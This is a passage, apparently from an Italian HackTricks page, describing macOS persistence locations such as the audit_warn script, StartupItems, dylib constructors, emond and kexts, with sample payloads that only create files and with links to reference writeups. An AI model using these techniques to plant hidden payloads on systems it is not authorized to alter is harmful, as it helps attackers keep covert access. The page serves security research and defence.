Poi, se necessario, per assicurarti che il server venga avviato potresti eseguire:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Esempio di codice per Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### Framework di auditing BSM

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Utile per bypassare la sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ma devi essere root, auditd deve essere in esecuzione e devi causare un warning
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- **`/etc/security/audit_warn`**
- Sono richiesti i privilegi di root
- **Trigger**: quando auditd rileva un warning

#### Descrizione ed exploit

Ogni volta che auditd rileva un warning, lo script **`/etc/security/audit_warn`** viene **eseguito**. Puoi quindi aggiungervi il tuo payload.<sup>[[33]](#references)</sup>
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Potresti forzare un avviso con `sudo audit -n`.

### Elementi di avvio

> [!CAUTION] > **Questa funzionalità è deprecata, quindi non dovrebbe essere trovato nulla in quelle directory.**

**StartupItem** è una directory che dovrebbe trovarsi in `/Library/StartupItems/` oppure in `/System/Library/StartupItems/`. Una volta creata, questa directory deve contenere due file specifici:

1. Uno **script rc**: uno shell script eseguito all'avvio.
2. Un **file plist**, denominato specificamente `StartupParameters.plist`, che contiene diverse impostazioni di configurazione.

Assicurati che sia lo script rc sia il file `StartupParameters.plist` siano posizionati correttamente all'interno della directory **StartupItem**, affinché il processo di avvio possa riconoscerli e utilizzarli.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Non riesco a trovare questo componente nel mio macOS, quindi per ulteriori informazioni consulta il writeup

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Introdotto da Apple, **emond** è un meccanismo di logging che sembra essere incompleto o forse abbandonato, ma rimane comunque accessibile. Sebbene non sia particolarmente utile per un amministratore Mac, questo servizio poco conosciuto potrebbe fungere da metodo di persistenza discreto per gli threat actor, probabilmente inosservato dalla maggior parte degli amministratori macOS.<sup>[[34]](#references)</sup>

Per chi è a conoscenza della sua esistenza, identificare eventuali utilizzi malevoli di **emond** è semplice. Il LaunchDaemon di sistema per questo servizio cerca gli script da eseguire in un'unica directory. Per esaminarla, è possibile utilizzare il seguente comando:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Posizione

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Root richiesto
- **Trigger**: Con XQuartz

#### Descrizione & Exploit

XQuartz **non è più installato in macOS**, quindi per ulteriori informazioni consulta il writeup.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Installare un kext è così complicato, anche come root, che non è considerato una tecnica pratica di sandbox-escape o persistence, a meno che tu non disponga di un exploit.

#### Posizione

Per installare un KEXT come elemento di avvio, è necessario **installarlo in una delle seguenti posizioni**:

- `/System/Library/Extensions`
- File KEXT integrati nel sistema operativo OS X.
- `/Library/Extensions`
- File KEXT installati da software di terze parti

Puoi elencare i file kext attualmente caricati con:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Per ulteriori informazioni sulle [**kernel extensions consulta questa sezione**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Posizione

- **`/usr/local/bin/amstoold`**
- Sono richiesti i privilegi di Root

#### Descrizione ed exploitation

A quanto pare, il `plist` di `/System/Library/LaunchAgents/com.apple.amstoold.plist` utilizzava questo binary esponendo al contempo un servizio XPC... il problema è che il binary non esisteva, quindi era possibile inserire qualcosa in quella posizione e, quando il servizio XPC veniva chiamato, sarebbe stato chiamato il tuo binary.<sup>[[35]](#references)</sup>

Non riesco più a trovarlo nel mio macOS.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Posizione

- **`/Library/Preferences/Xsan/.xsanrc`**
- Sono richiesti i privilegi di Root
- **Trigger**: quando il servizio viene eseguito (raramente)

#### Descrizione ed exploit

A quanto pare, non è molto comune eseguire questo script e non sono riuscito nemmeno a trovarlo nel mio macOS, quindi, se vuoi maggiori informazioni, consulta il writeup.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Questo non funziona nelle versioni moderne di MacOS**

È anche possibile inserire qui **comandi che verranno eseguiti all'avvio.** Esempio di script rc.common regolare:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Tecniche e strumenti di persistence

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, l'anno degli Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Oltre i buoni vecchi LaunchAgents - 1 - file di avvio della shell](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Oltre i buoni vecchi LaunchAgents - 18 - X11 e XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Oltre i buoni vecchi LaunchAgents - 21 - applicazioni riaperte](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Oltre i buoni vecchi LaunchAgents - 20 - preferenze di Terminal](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Oltre i buoni vecchi LaunchAgents - 13 - plugin audio](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Plug-in Audio Unit (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Oltre i buoni vecchi LaunchAgents - 12 - plugin QuickLook](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Oltre i buoni vecchi LaunchAgents - 22 - LoginHook e LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Oltre i buoni vecchi LaunchAgents - 4 - processi cron](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Oltre i buoni vecchi LaunchAgents - 2 - avvio di iTerm2](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Oltre i buoni vecchi LaunchAgents - 7 - plugin xbar](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Oltre i buoni vecchi LaunchAgents - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Oltre i buoni vecchi LaunchAgents - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Oltre i buoni vecchi LaunchAgents - 3 - elementi di login](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Oltre i buoni vecchi LaunchAgents - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Oltre i buoni vecchi LaunchAgents - 24 - azioni sulle cartelle](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Azioni sulle cartelle per la persistence su macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Oltre i buoni vecchi LaunchAgents - 27 - scorciatoie del Dock](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Oltre i buoni vecchi LaunchAgents - 17 - selettori di colore](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Oltre i buoni vecchi LaunchAgents - 26 - plugin Finder Sync](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Analisi della persistence di "Mac File Opener" (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Oltre i buoni vecchi LaunchAgents - 16 - salvaschermo](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Salvare l'accesso: salvaschermi per la persistence su macOS (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Oltre i buoni vecchi LaunchAgents - 11 - importatori di Spotlight](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Oltre i buoni vecchi LaunchAgents - 9 - pannello delle preferenze](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Oltre i buoni vecchi LaunchAgents - 19 - script periodici](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Oltre i buoni vecchi LaunchAgents - 5 - moduli di autenticazione collegabili (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Oltre i buoni vecchi LaunchAgents - 28 - plugin di autorizzazione](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Furto persistente di credenziali con i plugin di autorizzazione (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Oltre i buoni vecchi LaunchAgents - 30 - il file di configurazione di man - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Oltre i buoni vecchi LaunchAgents - 25 - moduli Apache2](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Oltre i buoni vecchi LaunchAgents - 31 - framework di audit BSM](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Oltre i buoni vecchi LaunchAgents - 23 - emond, il demone di monitoraggio degli eventi](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Oltre i buoni vecchi LaunchAgents - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Oltre i buoni vecchi LaunchAgents - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
{{#include ../banners/hacktricks-training.md}}
